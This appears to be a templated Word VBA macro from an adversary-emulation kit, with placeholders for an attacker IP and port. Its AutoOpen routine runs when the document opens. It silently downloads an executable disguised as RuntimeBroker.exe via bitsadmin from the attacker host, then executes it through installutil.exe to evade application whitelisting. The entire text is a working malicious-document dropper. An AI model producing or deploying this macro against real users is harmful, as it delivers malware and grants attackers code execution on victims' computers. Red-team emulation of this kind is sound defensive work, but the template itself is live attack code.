content: |
  Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
  Function RunCommand(cmd As String) As Long
      RunCommand = Shell(cmd, vbHide)
  End Function

  Sub AutoOpen()
      Dim myURL As String
      Dim LocalFilePath As String

      myURL = "http://{{ attacker_ip }}:{{ delivery_outbound_port }}/RuntimeBroker.exe"
      LocalFilePath = "C:\Windows\Temp\RuntimeBroker.exe"

      RunCommand "cmd.exe /c bitsadmin /transfer myJob /download /priority normal " & myURL & " " & LocalFilePath
      Sleep 6000
      RunCommand "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U " & LocalFilePath
  End Sub
